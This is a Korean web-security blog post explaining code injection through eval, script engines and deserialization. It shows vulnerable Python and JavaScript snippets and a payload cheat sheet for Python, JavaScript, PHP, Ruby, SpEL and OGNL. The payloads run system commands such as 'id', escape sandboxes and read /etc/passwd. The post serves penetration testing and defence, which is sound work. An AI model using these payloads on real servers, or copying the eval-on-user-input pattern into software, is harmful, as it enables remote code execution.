---
title: "동적 코드 평가 (eval·스크립트 엔진)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Code Injection]
tags: [eval, code-injection, deserialization, web]
description: "사용자 입력이 eval·스크립트 엔진·수식 평가에 닿을 때 서버에서 코드가 실행되는 동적 코드 평가의 개념과, 언어별 평가 주입 구문을 정리합니다."
mermaid: true
---

> 입력을 **코드로 해석해 실행하는 함수**(eval, 스크립트 엔진, 수식 평가기)에 사용자 값이 닿으면, 공격자는 서버에서 임의 코드를 실행한다. SSTI가 템플릿이라면, 이쪽은 언어 런타임 자체다.

## 개념

편의를 위해 "문자열을 코드로 실행"하는 지점이 발생 원인이다 — 계산기 기능, 규칙 엔진, 동적 필터, 설정 수식, 직렬화된 객체 복원.

```python
result = eval(request.args["expr"])        # Python: expr=__import__('os').system('id')
```
```javascript
const f = new Function("x", req.body.rule);  // JS: rule 안에 임의 코드
```

언어마다 통로가 다르다. Python `eval`/`exec`/`pickle`, JS `eval`/`Function`/`vm`, PHP `eval`/`assert`/`create_function`, Ruby `eval`/`send`, Java 스크립트 엔진(Nashorn)·OGNL/SpEL 식. "정규식으로 `{}`를 막았다"는 방어는, 입력이 평가 함수에 닿는 구조 자체가 문제라 소용없다.

## 공격·우회 구문

영향 증명은 무해한 값으로. 임의 코드 실행 시도는 허가 범위에서만.

### 탐지 (수식 평가)

```
expr=7*7        → 49 가 나오면 평가됨
expr=1337-1     → 1336
```

### 언어별 평가 주입

```
Python:  __import__('os').system('id')
         ().__class__.__bases__[0].__subclasses__()   # 샌드박스 탈출 탐색
JS:      process.mainModule.require('child_process').execSync('id')
         this.constructor.constructor('return process')()
PHP:     system('id');  /  assert("file_get_contents('/etc/passwd')")
Ruby:    `id`  /  system('id')  /  eval("...")
Java(SpEL): T(java.lang.Runtime).getRuntime().exec('id')
OGNL:    (#rt=@java.lang.Runtime@getRuntime()).exec('id')
```

### 역직렬화 경유 (코드 실행)

```
Python pickle: 신뢰 못 할 데이터 loads → __reduce__ 로 실행
PHP unserialize: 매직 메서드(__wakeup/__destruct) 체인(POP gadget)
Java: ObjectInputStream.readObject + 취약 라이브러리(gadget chain)
→ 입력이 역직렬화 함수에 닿는지, 허용 클래스 목록이 있는지
```

### 확인 요령

```
오류 메시지에 언어 런타임 예외(SyntaxError·ParseError)가 나오면 입력이 코드로 파싱되는 증거
```

## 참고 자료

- [OWASP WSTG: Testing for Code Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)
- [CWE-94: Improper Control of Generation of Code (Code Injection)](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
